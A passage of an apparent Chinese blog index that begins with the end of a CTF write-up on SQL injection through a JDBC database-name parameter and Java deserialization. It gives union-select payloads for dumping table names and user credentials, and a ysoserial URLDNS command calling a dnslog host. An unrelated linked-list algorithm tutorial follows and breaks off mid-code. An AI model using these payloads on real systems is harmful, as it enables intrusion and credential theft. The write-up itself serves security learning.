class="string">&quot;IS_AUTOINCREMENT&quot;</span>), data.getString(<span class="string">&quot;REMARKS&quot;</span>), data.getString(<span class="string">&quot;COLUMN_NAME&quot;</span>).equals(PK) ? <span class="string">&quot;true&quot;</span> : <span class="literal">null</span>, data.getString(<span class="string">&quot;COLUMN_SIZE&quot;</span>));</span><br><span class="line">                    table.list.add(row);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                Tables.add(table);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException var16) &#123;</span><br><span class="line">            var16.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Tables;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码使用jdbc连接数据库，且我们可以知道的是数据库连接的账号密码，以及存在myapp库。<br>我们可控的变量是 dbName ，正常来说 dbname 应当是个数据库名称<br>所以我们应当构造 dbname ，既能够使数据库成功连接到myapp库，又能够闭合执行语句，执行我们自定义的代码<br><a href="https://www.cnblogs.com/ljl150/p/12045942.html">https://www.cnblogs.com/ljl150/p/12045942.html</a><br>JDBC解析数据库的方式类似于URL解析，也就是在构造这条语句时：<code>dbName = &quot;jdbc:mysql://mysqldbserver:3306/&quot; + dbName;</code><br>我们需要传入的dbName被成功解析为myapp，有两种思路构造：</p><ul><li>#的方式：在url中#表示锚点，表示网页中的一个位置，比如http:xxx&#x2F;index.html#aaa，浏览器读取这个url，会将aaa移到可视位置。在第一个#，都会被视为位置标识符，不会被发送到服务端</li><li>?参数 的方式，因为在URL中？后面的内容将被视为参数，就可以构造类似这样的http:xxx&#x2F;index.html?a&#x3D;1，后面再跟闭合和注入语句</li></ul><p>那么我们构造下面的payload获取数据库的表名：<br><code>myapp?a=111&#39; union select group_concat(table_name) from (information_schema.tables);#</code><br>得到如下输出：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;list&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;isAuto&quot;</span><span class="punctuation">:</span> <span class="string">&quot;YES&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;isNull&quot;</span><span class="punctuation">:</span> <span class="string">&quot;NO&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;isPK&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;id&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;remark&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;size&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;INT&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;isAuto&quot;</span><span class="punctuation">:</span> <span class="string">&quot;NO&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;isNull&quot;</span><span class="punctuation">:</span> <span class="string">&quot;YES&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;name&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;remark&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;size&quot;</span><span class="punctuation">:</span> <span class="string">&quot;256&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;VARCHAR&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;isAuto&quot;</span><span class="punctuation">:</span> <span class="string">&quot;NO&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;isNull&quot;</span><span class="punctuation">:</span> <span class="string">&quot;YES&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pwd&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;remark&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;size&quot;</span><span class="punctuation">:</span> <span class="string">&quot;256&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;VARCHAR&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;tableName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;user&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;操作成功&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;timestamps&quot;</span><span class="punctuation">:</span> <span class="number">1726551375306</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>判断得user表中存在name和pwd字段，构造下面的payload查询：<br><code>myapp?a=111&#39; union select group_concat(name, pwd) from (user);#</code><br>得到账号密码为：admin admin@Rrrr_ctf_asde，接着利用上面的接口测试<br><img src="/2024/09/12/WebSecurity/owasptop/javadeserialization/image-3.png"><br>这里看到返回的值，明显是java序列化后的特征，使用获取到的凭证测试第一个接口post &#x2F;common&#x2F;user&#x2F;current 成功执行，判断该接口对数据进行反序列化，使用ysoserial测试：<br><a href="https://blog.csdn.net/st3pby/article/details/135111050">https://blog.csdn.net/st3pby/article/details/135111050</a><br><code>java -jar ysoserial-all.jar URLDNS &quot;http://xho2o5.dnslog.cn&quot; &gt; f.txt</code><br>之后使用脚本处理下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;f.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line"></span><br><span class="line">now = file.read()</span><br><span class="line">ba = base64.b64encode(now)</span><br><span class="line"><span class="built_in">print</span>(ba)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><p>将处理后的数据作为token传输，成功验证存在漏洞，之后就可以通过反弹shell等方式获取flag</p><p>待办：cc链 Cb链分析</p><h2 id="DASCTF-Java反序列化-easyjava"><a href="#DASCTF-Java反序列化-easyjava" class="headerlink" title="[DASCTF][Java反序列化]easyjava"></a>[DASCTF][Java反序列化]easyjava</h2><p><a href="https://blog.csdn.net/solitudi/article/details/119322658">https://blog.csdn.net/solitudi/article/details/119322658</a></p><h1 id="CVE漏洞"><a href="#CVE漏洞" class="headerlink" title="CVE漏洞"></a>CVE漏洞</h1><h2 id="Jboss-反序列化-CVE-2017-12149"><a href="#Jboss-反序列化-CVE-2017-12149" class="headerlink" title="Jboss 反序列化(CVE-2017-12149)"></a>Jboss 反序列化(CVE-2017-12149)</h2><p><a href="https://www.cnblogs.com/sainet/p/15632205.html">https://www.cnblogs.com/sainet/p/15632205.html</a></p><h2 id="Weblogic反序列化（CVE-2023-21839）"><a href="#Weblogic反序列化（CVE-2023-21839）" class="headerlink" title="Weblogic反序列化（CVE-2023-21839）"></a>Weblogic反序列化（CVE-2023-21839）</h2><p><a href="https://www.cnblogs.com/BlogVice-2203/p/17454727.html">https://www.cnblogs.com/BlogVice-2203/p/17454727.html</a></p><h2 id="Fastjson-反序列化"><a href="#Fastjson-反序列化" class="headerlink" title="Fastjson 反序列化"></a>Fastjson 反序列化</h2><p><a href="https://blog.nsfocus.net/fastjson-remote-deserialization-program-validation-analysis/">https://blog.nsfocus.net/fastjson-remote-deserialization-program-validation-analysis/</a></p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 反序列化漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【算法】链表</title>
      <link href="/2024/09/11/algorithm/List/"/>
      <url>/2024/09/11/algorithm/List/</url>
      
        <content type="html"><![CDATA[<p>算法系列文章目前是跟着<a href="https://www.programmercarl.com/">代码随想录</a>学习</p><h2 id="链表基础"><a href="#链表基础" class="headerlink" title="链表基础"></a>链表基础</h2><p>单链表、双链表（每一个节点有两个指针域，一个指向下一个节点，一个指向上一个节点）、循环链表<br>链表操作的两种方式：直接使用原来的链表来进行操作。设置一个虚拟头结点在进行操作。<br>链表的存储方式：数组（内存中连续）、链表(内存中不连续)</p><ul><li><strong>链表类型</strong>：单链表、双链表、循环链表的基本构成和特点。</li><li><strong>操作方式</strong>：直接修改原链表或使用虚拟头结点简化边界情况处理。</li><li><strong>存储方式</strong>：链表通过非连续存储方式实现灵活的元素插入与删除。</li></ul><h3 id="链表操作与实现"><a href="#链表操作与实现" class="headerlink" title="链表操作与实现"></a>链表操作与实现</h3><ol><li><p><strong>设计链表</strong> (<code>707.设计链表</code>)</p><ul><li>实现一个链表类，包括添加、获取、删除节点的操作。</li><li>代码示例（单链表）:<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyLinkedList</span> &#123;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    ListNode head; <span class="comment">// Sentinel node as pseudo-head</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyLinkedList</span><span class="params">()</span> &#123;</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">        head = <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实现方法省略...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>代码示例（双链表）:<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyLinkedList</span> &#123;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    ListNode head, tail; <span class="comment">// Sentinel nodes as pseudo-head and pseudo-tail</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyLinkedList</span><span class="params">()</span> &#123;</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">        head = <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        tail = <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        head.next = tail;</span><br><span class="line">        tail.prev = head;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实现方法省略...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>反转链表</strong> (<code>206.反转链表</code>)</p><ul><li>使用迭代和递归方法实现链表反转。</li><li>代码示例（迭代方法）:<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> <span class="literal">null</span>, curr = head;</span><br><span class="line">    <span class="keyword">while</span> (curr != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">nextTemp</span> <span class="operator">=</span> curr.next;</span><br><span class="line">        curr.next = prev;</span><br><span class="line">        prev = curr;</span><br><span class="line">        curr = nextTemp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> prev;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>代码示例（递归方法）:<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (head == <span class="literal">null</span> || head.next == <span class="literal">null</span>) <span class="keyword">return</span> head;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">p</span> <span class="operator">=</span> reverseList(head.next);</span><br><span class="line">    head.next.next = head;</span><br><span class="line">    head.next = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>删除链表的倒数第 N 个结点</strong> (<code>19.删除链表的倒数第 N 个结点</code>)</p><ul><li>使用快慢指针技巧找到倒数第 N 个节点并删除。</li><li>代码示例:<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">removeNthFromEnd</span><span class="params">(ListNode head, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">    dummy.next = head;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> dummy, slow = dummy;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        fast = fast.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (fast != <span class="literal">null</span>) &#123;</span><br><span class="line">        slow = slow.next;</span><br><span class="line">        fast = fast.next;</span><br><span class="line">    &#125;</span><br><span class="line">    slow.next = slow.next.next;</span><br><span class="line">    <span class="keyword">return</span> dummy.next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>链表相交</strong> (<code>面试题 02.07.链表相交</code>)</p><ul><li>使用双指针策略检测并返回两个链表的相交点。</li><li>代码示例:<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">getIntersectionNode</span><span class="params">(ListNode headA, ListNode headB)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (headA == <span class="literal">null</span> || headB == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">a</span> <span class="operator">=</span> headA, b = headB;</span><br><span class="line">    <span class="keyword">while</span> (a != b) &#123;</span><br><span class="line">        a = a == <span class="literal">null</span> ? headB : a.next;</span><br><span class="line">        b = b == <span class="literal">null</span> ? headA : b.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>环形链表 II</strong> (<code>142.环形链表 II</code>)</p><ul><li>判断链表是否有环，并找到环的入口。</li><li>代码示例:<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">detectCycle</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> head, fast = head;</span><br><span class="line">    <span class="keyword">while</span> (fast != <span class="literal">null</span> &amp;&amp; fast.next != <span class="literal">null</span>) &#123;</span><br><span class="line">        slow = slow.next;</span><br><span class="line">        fast = fast.next.next;</span><br><span class="line">        <span class="keyword">if</span> (slow == fast) &#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">slow2</span> <span class="operator">=</span> head;</span><br><span class="line">            <span class="keyword">while</span> (slow2 != slow) &#123;</span><br><span class="line">                slow2 = slow2.next;</span><br><span class="line">                slow = slow.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> slow;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ol><h3 id="优化建议与高级技巧"><a href="#优化建议与高级技巧" class="headerlink" title="优化建议与高级技巧"></a>优化建议与高级技巧</h3><ul><li><strong>虚拟头节点</strong>：使用虚拟头节点简化对链表头部节点的操作，尤其是在插入和删除操作中。</li><li><strong>双指针技术</strong>：广泛应用于链表中，如在快速找到中点、倒数第 N 个节点、检测环等问题中。</li></ul><h2 id="707-设计链表"><a href="#707-设计链表" class="headerlink" title="707.设计链表"></a>707.设计链表</h2><p>题意：<br>在链表类中实现这些功能：<br>get(index)：获取链表中第 index 个节点的值。如果索引无效，则返回-1。<br>addAtHead(val)：在链表的第一个元素之前添加一个值为 val 的节点。插入后，新节点将成为链表的第一个节点。<br>addAtTail(val)：将值为 val 的节点追加到链表的最后一个元素。<br>addAtIndex(index,val)：在链表中的第 index 个节点之前添加值为 val  的节点。如果 index 等于链表的长度，则该节点将附加到链表的末尾。如果 index 大于链表长度，则不会插入节点。如果index小于0，则在头部插入节点。<br>deleteAtIndex(index)：如果索引 index 有效，则删除链表中的第 index 个节点。</p><p>单链表版本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ListNode</span>&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    ListNode next;</span><br><span class="line">    ListNode()&#123;&#125;</span><br><span class="line">    ListNode(<span class="type">int</span> val)&#123;</span><br><span class="line">        <span class="built_in">this</span>.val = val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyLinkedList</span>&#123;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    ListNode head;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyLinkedList</span><span class="params">()</span>&#123;</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">        head = <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= index; i++)&#123;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cur.val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtHead</span><span class="params">(<span class="type">int</span> val)</span>&#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(val);</span><br><span class="line">        newNode.next = head.next;</span><br><span class="line">        head.next = newNode;</span><br><span class="line">        size++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtTail</span><span class="params">(<span class="type">int</span> val)</span>&#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(val);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span>(cur.next != <span class="literal">null</span>)&#123;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        cur.next = newNode;</span><br><span class="line">        size++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtIndex</span><span class="params">(<span class="type">int</span> index, <span class="type">int</span> val)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &gt; size)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            index = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        size++;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">pred</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;index;i++)&#123;</span><br><span class="line">            pred = pred.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">toAdd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(val);</span><br><span class="line">        toAdd.next = pred.next;</span><br><span class="line">        pred.next = toAdd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deleteAtIndex</span><span class="params">(<span class="type">int</span> index)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        size--;</span><br><span class="line">        ListNode pred= head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; index;i++)&#123;</span><br><span class="line">            pred = pred.next;</span><br><span class="line">        &#125;</span><br><span class="line">        pred.next = pred.next.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>双链表版本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ListNode</span>&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    ListNode next,prev;</span><br><span class="line">    ListNode()&#123;&#125;</span><br><span class="line">    ListNode(<span class="type">int</span> val)&#123;</span><br><span class="line">        <span class="built_in">this</span>.val = val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyLinkedList</span>&#123;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    ListNode head,tail;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyLinkedList</span><span class="params">()</span>&#123;</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">        head = <span class="keyword">new</span> <span class="title 